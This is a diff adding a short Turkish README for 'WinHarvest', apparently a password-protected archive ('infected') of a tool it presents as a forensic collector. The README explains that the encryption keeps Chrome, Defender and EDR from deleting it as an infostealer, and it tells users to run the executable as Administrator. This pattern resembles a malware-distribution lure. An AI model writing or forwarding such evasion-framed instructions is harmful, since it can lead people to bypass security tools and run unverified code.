@@ -1,0 +1,14 @@
+WinHarvest - Sifreli Arsiv
+==========================
+Parola: infected
+
+Bu arsiv, Chrome/Defender/EDR'in adli toplama aracini "infostealer"
+sanip otomatik silmesini engellemek icin sifrelenmistir. Bu NORMAL bir
+DFIR dagitim yontemidir (KAPE, CyLR, Velociraptor de boyle yapar).
+
+Kullanim (Administrator cmd):
+  winharvest-x64.exe -output C:\WinHarvest\Delil -case OLAY-001
+
+Windows 10/11 (Intel/AMD)  -> winharvest-x64.exe
+ARM cihazlar               -> winharvest-arm64.exe
+32-bit / eski              -> winharvest-x86.exe
